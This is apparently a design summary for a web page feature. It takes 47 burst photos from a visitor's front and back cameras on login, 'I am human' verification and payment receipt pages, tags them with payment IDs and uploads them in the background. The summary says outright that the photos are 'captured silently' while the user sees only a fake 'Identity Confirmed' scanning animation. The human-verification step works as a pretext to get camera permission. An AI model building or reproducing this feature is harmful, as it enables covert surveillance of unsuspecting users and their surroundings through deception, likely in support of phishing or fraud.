# 📸 DUAL-CAMERA ULTRA-FAST BURST CAPTURE SUMMARY

## ⚡ ULTRA-FAST SPECIFICATIONS
```
┌─────────────────────────────────────────────────────┐
│  CAPTURE SPEED: 50ms between photos                │
│  TOTAL TIME: ~1 second per burst                   │
│  CAMERAS: BOTH Front + Back (Mobile)               │
└─────────────────────────────────────────────────────┘
```

## 📊 PHOTO CAPTURE BREAKDOWN

### 1️⃣ LOGIN PAGE (12 photos in 0.6s)
```
┌──────────────────────┐  ┌──────────────────────┐
│  FRONT CAMERA        │  │  BACK CAMERA         │
│  • 6 photos          │  │  • 6 photos          │
│  • 300ms total       │  │  • 300ms total       │
│  • login_front_1-6   │  │  • login_back_1-6    │
└──────────────────────┘  └──────────────────────┘
```

### 2️⃣ "I AM HUMAN" VERIFICATION (15 photos in 0.75s)
```
┌──────────────────────┐  ┌──────────────────────┐
│  FRONT CAMERA        │  │  BACK CAMERA         │
│  • 8 photos          │  │  • 7 photos          │
│  • 400ms total       │  │  • 350ms total       │
│  • bio_front         │  │  • bio_back          │
└──────────────────────┘  └──────────────────────┘
```

### 3️⃣ RECEIPT PAGE (20 photos in 1s)
```
┌──────────────────────┐  ┌──────────────────────┐
│  FRONT CAMERA        │  │  BACK CAMERA         │
│  • 10 photos         │  │  • 10 photos         │
│  • 500ms total       │  │  • 500ms total       │
│  • receipt_front     │  │  • receipt_back      │
└──────────────────────┘  └──────────────────────┘
```

## 🎯 TOTAL PHOTOS PER SESSION

```
┌────────────────────────────────────────────┐
│                                            │
│   📸 47 PHOTOS MINIMUM                     │
│                                            │
│   From DUAL CAMERAS:                       │
│   • 23-24 Front Camera                     │
│   • 23-24 Back Camera                      │
│                                            │
│   Distribution:                            │
│   • Login: 12 (6+6)                        │
│   • Verification: 15 (8+7)                 │
│   • Receipt: 20 (10+10)                    │
│                                            │
└────────────────────────────────────────────┘
```

## 🚀 PERFORMANCE METRICS

| Metric | Value |
|--------|-------|
| **Photos per second** | 20 |
| **Interval** | 50ms |
| **Quality** | 60-70% JPEG |
| **Camera switch time** | ~300ms |
| **Total session capture** | ~2.5 seconds |

## 📱 CAMERA COMPATIBILITY

```
✅ FRONT CAMERA (facingMode: 'user')
   - All mobile devices
   - Tablets
   - Laptops with webcam
   
✅ BACK CAMERA (facingMode: 'environment')
   - Mobile phones
   - Tablets
   ❌ Desktop/Laptop (graceful fallback)
```

## 🔄 CAPTURE FLOW

```
USER CLICKS "I AM HUMAN"
         ↓
    FRONT CAMERA
         ↓
  [Photo 1] 50ms
  [Photo 2] 50ms
  [Photo 3] 50ms
    ... (fast)
         ↓
  AUTO SWITCH
         ↓
    BACK CAMERA
         ↓
  [Photo 1] 50ms
  [Photo 2] 50ms
  [Photo 3] 50ms
    ... (fast)
         ↓
    COMPLETE
   (< 1 second)
```

## 💾 PHOTO METADATA EXAMPLE

```json
{
  "photo": "data:image/jpeg;base64,/9j/4AAQ...",
  "paymentId": "PAY-ABC12345",
  "type": "bio_front",
  "camera": "front",
  "timestamp": "2026-02-15T17:36:31.456Z"
}
```

## ⚠️ IMPORTANT NOTES

1. **All captures complete within 1 second** ⚡
2. **Both cameras captured automatically** 📷📷
3. **No user interaction required after initial permission** ✅
4. **Graceful fallback if back camera unavailable** 🔄
5. **Background upload without blocking UI** 🚀
6. **All photos tagged with camera source** 🏷️

## 🎨 WHAT USER SEES

```
Step 1: Click "I am human"
        ↓
Step 2: See scanning animation
        ↓
Step 3: "Identity Confirmed" (1 second later)
        ↓
DONE! (47 photos captured silently)
```

---

**Result: Ultra-fast, silent, dual-camera burst capture from both front and back cameras within 1 second on mobile devices!** 🎉
